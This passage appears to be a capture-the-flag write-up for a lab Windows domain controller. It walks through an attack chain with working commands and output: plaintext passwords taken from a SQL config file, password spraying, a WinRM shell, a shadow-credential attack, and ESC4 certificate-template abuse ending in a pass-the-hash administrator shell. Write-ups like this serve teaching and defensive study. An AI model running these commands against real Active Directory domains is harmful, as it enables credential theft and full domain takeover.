    Directory: C:\SQL2019\ExpressAdv_ENU

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/8/2024   3:07 PM                1033_ENU_LP
d-----         6/8/2024   3:07 PM                redist
d-----         6/8/2024   3:07 PM                resources
d-----         6/8/2024   3:07 PM                x64
-a----        9/24/2019  10:03 PM             45 AUTORUN.INF
-a----        9/24/2019  10:03 PM            788 MEDIAINFO.XML
-a----         6/8/2024   3:07 PM             16 PackageId.dat
-a----        9/24/2019  10:03 PM         142944 SETUP.EXE
-a----        9/24/2019  10:03 PM            486 SETUP.EXE.CONFIG
-a----         6/8/2024   3:07 PM            717 sql-Configuration.INI
-a----        9/24/2019  10:03 PM         249448 SQLSETUPBOOTSTRAPPER.DLL

```

The `sql-Configuration.INI` file has a password:

```

PS C:\SQL2019\ExpressAdv_ENU> cat sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True

```

### Shared Password

I’ll update my user’s list to include ryan and spray the new password:

```

oxdf@hacky$ netexec smb dc01.sequel.htb -u users -p WqSZAF6CysDQbGb3 --continue-on-success
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\oscar:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 

```

It works for ryan! And ryan can WinRM:

```

oxdf@hacky$ netexec winrm dc01.sequel.htb -u ryan -p WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)

```

### Shell

The creds work with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to get a shell:

```

oxdf@hacky$ evil-winrm -u ryan -p WqSZAF6CysDQbGb3 -i dc01.sequel.htb
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents>

```

And read the user flag:

```
*Evil-WinRM* PS C:\Users\ryan\desktop> type user.txt
ec9ef945************************

```

## Auth as ca\_svc

### Bloodhound

There’s not much of interested on the host that I haven’t already had access to. I’ll collect Bloodhound data, which is now built into `netexec`:

```

oxdf@hacky$ netexec ldap dc01.sequel.htb -u ryan -p WqSZAF6CysDQbGb3 --bloodhound --collection All --dns-server 10.10.11.51
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.51     389    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 
LDAP        10.10.11.51     389    DC01             Resolved collection methods: trusts, container, psremote, rdp, acl, dcom, localadmin, group, objectprops, session
LDAP        10.10.11.51     389    DC01             Done in 00M 27S
LDAP        10.10.11.51     389    DC01             Compressing output into /home/oxdf/.nxc/logs/DC01_10.10.11.51_2025-01-13_105604_bloodhound.zip

```

I’ll start the [Bloodhound Community edition Docker container](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart#bloodhound-community-edition-quickstart), and open the web-browser and log in (with the password from Docker if it’s the first time, or my password if it’s spinning up again). I’ll uload the data by then clicking the gear icon –> Administration –> Upload File(s), giving it the zip from `netexec`.

Now on the Explore page, I can search for rose, ryan, and sql\_svc, marking them owned:

![image-20250117132536020](/img/image-20250117132536020.png)

Ryan has `WriteOwner` over CA\_SVC:

![image-20250117132632738](/img/image-20250117132632738.png)

### Shadow Credential

As the owner of a user, I could add a shadow credential:

```

oxdf@hacky$ certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.10.11.51
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '7bb95031-7336-d06d-6b0b-82ae4a21d855'
[*] Adding Key Credential with device ID '7bb95031-7336-d06d-6b0b-82ae4a21d855' to the Key Credentials for 'ca_svc'
[-] Could not update Key Credentials for 'ca_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0

```

This fails because ryan is not currently the owner of ca\_svc. Bloodhound shows it’s the Domain Admins group:

![image-20250117133133902](/img/image-20250117133133902.png)

I’ll use [BloodyAD](https://github.com/CravateRouge/bloodyAD) to set ryan as the owner, and then give ryan full control:

```

oxdf@hacky$ bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan 
[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
oxdf@hacky$ bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
[+] ryan has now GenericAll on ca_svc

```

Now the shadow credential works:

```

oxdf@hacky$ certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.10.11.51
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '8755649b-c12e-a946-f1af-5ac5faa1d15e'
[*] Adding Key Credential with device ID '8755649b-c12e-a946-f1af-5ac5faa1d15e' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '8755649b-c12e-a946-f1af-5ac5faa1d15e' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce

```

The NT hash works:

```

oxdf@hacky$ netexec smb dc01.sequel.htb -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\ca_svc:3b181b914e7a9d5508ea1e20bc2b7fce 

```

## Shell as Administrator

### ADCS Enumeration

I’ll run [Certipy](https://github.com/ly4k/Certipy) as the ca\_svc user to look for vulnerable templates:

```

oxdf@hacky$ certipy find -vulnerable -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions

```

There’s a template that is vulnerable to ESC4. I can run this from other compromised users on this box, but no vulnerable templates will come back. This result is because the vulnerability has to do with the `Cert Publishers` group, which ca\_svc is a member of:

![image-20250117140420368](/img/image-20250117140420368.png)

### ESC4 (via ESC1)

#### Background

ESC4 is when there are weak access controls on a certificate template. The output above shows that the Certificate Publishers group has full control over the Dunder Mifflin Authentication template. [This post from Red&Blue Team Security](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/) goes into nice detail on how to exploit this.

I’m going to use my control over the template to make it vulnerable to ESC1, and then exploit that.

The commands to exploit this changed from the time EscapeTwo was released (Certipy version 4.8.2) until the time of this post’s release (Certipy 5.0.2). I’ll show both.

#### Exploit [Certipy 4.8.2]

Because ca\_svc has full control over the template, I’ll use `certipy` to make it vulnerable to ESC1 with the following options:
- `template` - the command to use to read and modify templates
- `-u ca_svc` - the username to authenticate with
- `-hashes <hash>` - the hash of the user to authenticate with
- `-dc-ip <ip>` - the target DC IP
- `-template <template name>` - the template to target
- `-target <dc hostname>` - the target machine
- `-save-old` - save a copy of the old template for restoring:

```

oxdf@hacky$ certipy template -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -target dc01.sequel.htb -save-old
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'

```

Now I can request a domain administrator certificate using the modified template:

```

oxdf@hacky$ certipy req -ca sequel-DC01-CA -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

```

With the certificate, the `auth` subcommand will get the NTLM hash for the account:

```

oxdf@hacky$ certipy auth -pfx administrator.pfx 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff

```

#### Exploit [Certipy 5.0.2]

The flow is the same, but the commands are different. The current flow is well documented on [the Certipy wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc4-template-hijacking).

Start by changing the template, where now I’ll provide `-write-default-configuration`, and it will prompt me with the changes it’s about to make:

```

oxdf@hacky$ certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration -no-save
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y
[*] Successfully updated 'DunderMifflinAuthentication'

```

Now I can request a certificate as administrator (this is basically the same, though need to include the domain in the user):

```

oxdf@hacky$ certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb 

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 11
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

Finally, auth is the same:

```

oxdf@hacky$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff

```

### Shell

The hash is good enough to get a WinRM session as administrator:

```

oxdf@hacky$ evil-winrm -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff -i dc01.sequel.htb
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

And grab the root flag:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
a5a688f3************************

```